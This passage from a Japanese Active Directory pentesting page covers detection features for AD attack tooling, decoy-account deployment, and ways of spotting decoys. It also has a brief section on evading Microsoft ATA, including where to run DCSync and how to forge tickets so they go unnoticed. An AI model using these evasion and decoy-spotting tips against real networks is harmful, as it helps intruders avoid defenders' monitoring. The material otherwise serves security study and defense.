  - `0xff` で埋められた DCE/RPC authentication padding
  - raw Kerberos `AP-REQ` を SPNEGO `mechToken` に直接配置する LDAP Kerberos bind
  - ASCII 文字列のように見える `ClientGuid` を含む SMB2/3 negotiate request
  - 標準外の namespace `//./root/cimv2` を使う WMI `IWbemLevel1Login::NTLMLogin`
  - ハードコードされた Kerberos nonce 値
- **相関・スコアリングの特徴量として使うのが適切なもの**:
  - 要素が少ない、または重複した Kerberos etype list、通常と異なる/欠落した `PA-DATA`、native Windows と異なる TGS-REQ etype の順序
  - version info のない NTLM Type 1 message、または host name が null の Type 3 message
  - SPNEGO ではなく DCE/RPC で運ばれる raw NTLMSSP、欠落した DCE/RPC verification trailer、SPNEGO/Kerberos OID の不一致
  - 同じ host/user/session/time window からこれらの特徴が複数見つかる場合、単独の弱い field よりもはるかに強いシグナルになります
- **単独の alert ではなく、補足情報として使うもの**:
  - デフォルトのファイル名、output path、ランダムな service name、一時的な batch name、デフォルトの computer account name、tool 固有の HTTP/WebDAV/RDP/MSSQL string
  - これらは攻撃者が簡単に変更できるため、複数 protocol にまたがる cluster が疑わしい理由を説明する用途に適しています
- **運用上の注意**:
  - これらのシグナルの一部を得るには、復号済みの traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service 側の可視性が必要です
  - alert に昇格する前に、Samba/Linux client、appliance、legacy software との照合を行ってください
  - ベースラインへの確信が高まるにつれて、検知を補足情報 -> hunting -> alerting の順に昇格させてください

### **Deception 技術の実装**

- Deception の実装では、パスワードが期限切れにならない、または Trusted for Delegation に設定されているといった特徴を持つ decoy user や computer などの罠を仕掛けます。具体的な方法として、特定の権限を持つ user を作成したり、高い権限を持つ group に追加したりします。<sup>[[2]](#references)</sup>
- 実用例として、次のような tool を使用できます: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception 技術の展開について詳しくは、[GitHub の Deploy-Deception](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **Deception の識別**

- **User object の場合**: 不審な兆候には、一般的でない ObjectSID、ログオン頻度の低さ、作成日、bad password count の少なさなどがあります。
- **一般的な兆候**: decoy の可能性がある object の attribute を本物の object と比較すると、不整合を発見できる場合があります。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) などの tool は、こうした deception の識別に役立ちます。

### **検知システムの回避**

- **Microsoft ATA の検知回避**:
  - **User enumeration**: ATA に検知されないよう、Domain Controller 上での session enumeration を避けます。
  - **Ticket impersonation**: ticket の作成に **aes** key を使うと、NTLM への downgrade を避けて検知を回避できます。
  - **DCSync attack**: ATA に検知されないよう、Domain Controller 以外から実行することを推奨します。Domain Controller から直接実行すると alert が発生します。

## References

- [1] [ドメイン trust 攻撃ガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory における deception のための trust の偽造](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin から Enterprise Admin へ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory exploitation 用のメモリ内 LDAP toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM hash を wordlist として weaponize する](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket を詳しく調べる](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Netlogon 経由で Active Directory account を乗っ取る Onelogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 に関連する Netlogon secure channel connection の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられた Null Session と MS-RPC interface を探る](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter は domain 間のセキュリティ境界か？ (Part 4) - SID filtering bypass の調査](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter は domain 間のセキュリティ境界か？ (Part 5) - Golden GMSA trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter は domain 間のセキュリティ境界か？ (Part 6) - Schema change trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 を使って DA から EA へ](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS の悪用によって child domain の管理者から enterprise admin へ5分で昇格する方法、その続編](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE を切り札に: Active Directory DACL backdoor の設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module の source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
